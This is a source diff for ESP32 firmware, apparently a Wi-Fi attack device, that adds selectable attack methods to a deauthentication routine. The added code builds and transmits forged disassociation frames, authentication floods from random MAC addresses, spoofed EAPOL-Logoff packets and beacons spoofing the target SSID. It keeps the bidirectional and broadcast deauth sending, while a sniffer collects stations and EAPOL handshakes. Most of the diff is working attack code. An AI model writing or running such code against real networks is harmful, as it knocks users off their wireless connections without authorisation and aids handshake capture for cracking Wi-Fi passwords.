@@ -150,6 +150,55 @@ static uint8_t s_apBssid[6];
 static String s_targetSsid;
 
 // Sniffer during deauth: discover stations (both directions) + catch EAPOL.
+static uint8_t s_method = 0;   // active technique (Method enum)
+
+// build a disassociation frame (subtype 0xA0) from the deauth template
+static void buildDisassoc(uint8_t* frame, const uint8_t* sta, const uint8_t* bssid) {
+    memcpy(frame, DEAUTH_TMPL, 26);
+    frame[0] = 0xa0; frame[1] = 0x00;              // disassoc
+    memcpy(frame+4, sta, 6);
+    memcpy(frame+10, bssid, 6);
+    memcpy(frame+16, bssid, 6);
+    frame[24] = 0x03; frame[25] = 0x00;            // reason 3: deauth->disassoc
+}
+// authentication flood frame (open-system auth request to the AP)
+static void buildAuthFlood(uint8_t* frame, const uint8_t* rndSta, const uint8_t* bssid) {
+    // auth frame: type mgmt b0, seq... body: alg=0, seq=1, status=0
+    static const uint8_t AUTH_TMPL[34] = {
+        0xb0, 0x00, 0x3a, 0x01,
+        0x00,0x00,0x00,0x00,0x00,0x00,       // addr1 = AP
+        0x02,0x00,0x00,0x00,0x00,0x00,       // addr2 = random STA
+        0x00,0x00,0x00,0x00,0x00,0x00,       // addr3 = AP
+        0xf0,0xff,                            // seq
+        0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00  // alg=0, seq=1, status=0
+    };
+    memcpy(frame, AUTH_TMPL, 30);
+    memcpy(frame+4, bssid, 6);
+    memcpy(frame+10, rndSta, 6);
+    memcpy(frame+16, bssid, 6);
+}
+// EAPOL-Logoff: EAPOL packet with logoff code, spoofed from a station
+static void buildEapolLogoff(uint8_t* frame, uint16_t& len, const uint8_t* sta,
+                             const uint8_t* bssid) {
+    // QoS-data header carrying EAPOL Logoff (code 2)
+    static const uint8_t LOGOFF[] = {
+        0x88,0x01,0x3a,0x01,                 // QoS data
+        0x00,0x00,0x00,0x00,0x00,0x00,       // addr1 = AP
+        0x02,0x00,0x00,0x00,0x00,0x00,       // addr2 = STA (spoofed)
+        0x00,0x00,0x00,0x00,0x00,0x00,       // addr3 = AP
+        0xf0,0xff, 0x00,0x00,                // QoS ctrl
+        0xaa,0xaa,0x03,0x00,0x00,0x00,       // LLC/SNAP
+        0x88,0x8e,                           // EAPOL ethertype
+        0x01,0x02,0x00,0x00,                 // version 1, code 2 (Logoff)
+        0x00,0x00,0x00,0x00                  // length 0
+    };
+    memcpy(frame, LOGOFF, sizeof(LOGOFF));
+    memcpy(frame+4, bssid, 6);
+    memcpy(frame+10, sta, 6);
+    memcpy(frame+16, bssid, 6);
+    len = sizeof(LOGOFF);
+}
+
 static void IRAM_ATTR attackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
     auto* pkt = (wifi_promiscuous_pkt_t*)buf;
@@ -179,34 +228,70 @@ static void IRAM_ATTR attackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type)
     if (sta[0] == 0xFF) return;      // skip broadcast
     s_stats.stations++;              // (approx dedupe; fine for display)
 
-    // deauth the station, forged from the target AP (WifiPhisher basic)
-    uint8_t frame[26];
-    memcpy(frame, DEAUTH_TMPL, 26);
-    memcpy(frame+4, sta, 6);
-    memcpy(frame+10, s_apBssid, 6);
-    memcpy(frame+16, s_apBssid, 6);
-    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK) s_stats.deauths++;
-    // and the reverse direction (AP gets told the client is gone) - Marauder
-    frame[4] = s_apBssid[0]; frame[5] = s_apBssid[1]; frame[6] = s_apBssid[2];
-    frame[7] = s_apBssid[3]; frame[8] = s_apBssid[4]; frame[9] = s_apBssid[5];
-    frame[10] = sta[0]; frame[11] = sta[1]; frame[12] = sta[2];
-    frame[13] = sta[3]; frame[14] = sta[4]; frame[15] = sta[5];
-    frame[16] = sta[0]; frame[17] = sta[1]; frame[18] = sta[2];
-    frame[19] = sta[3]; frame[20] = sta[4]; frame[21] = sta[5];
-    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK) s_stats.deauths++;
+    uint8_t frame[64]; uint16_t flen = 26;
+    switch (s_method) {
+        case M_DISASSOC:
+            buildDisassoc(frame, sta, s_apBssid);
+            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false)==ESP_OK) s_stats.deauths++;
+            break;
+        case M_EAPOL_LOGOFF:
+            buildEapolLogoff(frame, flen, sta, s_apBssid);
+            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false)==ESP_OK) s_stats.deauths++;
+            break;
+        default:   // M_DEAUTH both directions
+            memcpy(frame, DEAUTH_TMPL, 26);
+            memcpy(frame+4, sta, 6);
+            memcpy(frame+10, s_apBssid, 6);
+            memcpy(frame+16, s_apBssid, 6);
+            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
+            memcpy(frame+4, s_apBssid, 6);
+            memcpy(frame+10, sta, 6);
+            memcpy(frame+16, sta, 6);
+            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
+            break;
+    }
 }
 
 // Also broadcast deauths on a timer: hits stations we never saw (sleeping)
 static volatile bool s_bcast = false;
 static void bcastTask(void*) {
-    uint8_t frame[26];
-    memcpy(frame, DEAUTH_TMPL, 26);
-    memcpy(frame+10, s_apBssid, 6);
-    memcpy(frame+16, s_apBssid, 6);
+    uint8_t frame[64]; uint16_t flen;
+    uint8_t rnd[6];
     while (s_attacking) {
         if (s_bcast) {
-            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false) == ESP_OK)
-                s_stats.deauths++;
+            if (s_method == M_AUTH_FLOOD) {
+                esp_fill_random(rnd, 6); rnd[0] = (rnd[0] & 0xFC) | 0x02;
+                buildAuthFlood(frame, rnd, s_apBssid);
+                for (int i = 0; i < 10; i++)
+                    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 30, false)==ESP_OK) s_stats.deauths++;
+            } else if (s_method == M_DISASSOC) {
+                buildDisassoc(frame, (const uint8_t*)"\xff\xff\xff\xff\xff\xff", s_apBssid);
+                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
+            } else if (s_method == M_BEACON_SPAM) {
+                // fake beacons spoofing the TARGET AP's SSID on its channel -
+                // churns client neighbor lists and confuses scanners
+                static uint8_t beacon[128];
+                memset(beacon, 0, sizeof(beacon));
+                beacon[0]=0x80; beacon[1]=0x00;                  // beacon
+                memcpy(beacon+10, s_apBssid, 6);                 // src = AP
+                memcpy(beacon+16, s_apBssid, 6);                 // bssid
+                memset(beacon+24, 0, 8);                         // timestamp
+                beacon[32]=100; beacon[33]=0;                    // interval
+                beacon[34]=0x21; beacon[35]=0x00;                // caps
+                uint8_t ssidLen = s_targetSsid.length();
+                if (ssidLen > 32) ssidLen = 32;
+                beacon[36]=0x00; beacon[37]=ssidLen;             // SSID tag
+                memcpy(beacon+38, s_targetSsid.c_str(), ssidLen);
+                beacon[38+ssidLen]=0x01; beacon[39+ssidLen]=0x01; beacon[40+ssidLen]=0x82; // rates
+                for (int i = 0; i < 5; i++)
+                    if (esp_wifi_80211_tx(WIFI_IF_STA, beacon, 41+ssidLen, false)==ESP_OK)
+                        s_stats.deauths++;
+            } else {                                              // default deauth bcast
+                memcpy(frame, DEAUTH_TMPL, 26);
+                memcpy(frame+10, s_apBssid, 6);
+                memcpy(frame+16, s_apBssid, 6);
+                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false)==ESP_OK) s_stats.deauths++;
+            }
         }
         delay(500);
     }
@@ -222,8 +307,9 @@ static void restoreWifi() {
 }
 
 static void attackTask(void* pv) {
-    auto* args = (std::pair<String,uint32_t>*)pv;
-    String ssid = args->first; uint32_t seconds = args->second;
+    auto* args = (std::pair<String,std::pair<uint32_t,uint8_t>>*)pv;
+    String ssid = args->first; uint32_t seconds = args->second.first;
+    uint8_t method = args->second.second;
     delete args;
 
     // locate target
@@ -286,6 +372,7 @@ static void attackTask(void* pv) {
     esp_wifi_set_promiscuous_rx_cb(&attackSniffCb);
 
     s_bcast = true;
+    s_method = method;
     TaskHandle_t bc;
     xTaskCreatePinnedToCore(bcastTask, "bcast", 4096, nullptr, 1, &bc, 0);
 
@@ -308,12 +395,13 @@ static void attackTask(void* pv) {
 
 void bootBtnAbortNote() {}  // handled via g_state.bootBtnAbort polled above
 
-bool startDeauth(const String& ssid, uint32_t seconds) {
+bool startDeauth(const String& ssid, uint32_t seconds, uint8_t method) {
     if (s_attacking || ducky::isRunning()) return false;
+    s_method = (Method)method;
     s_stats = Stats();
     s_attacking = true;
     g_state.bootBtnAbort = false;
-    auto* args = new std::pair<String,uint32_t>(ssid, seconds);
+    auto* args = new std::pair<String,std::pair<uint32_t,uint8_t>>(ssid, {seconds, method});
     xTaskCreatePinnedToCore(attackTask, "deauth", 12288, args, 1, nullptr, 0);
     return true;
 }
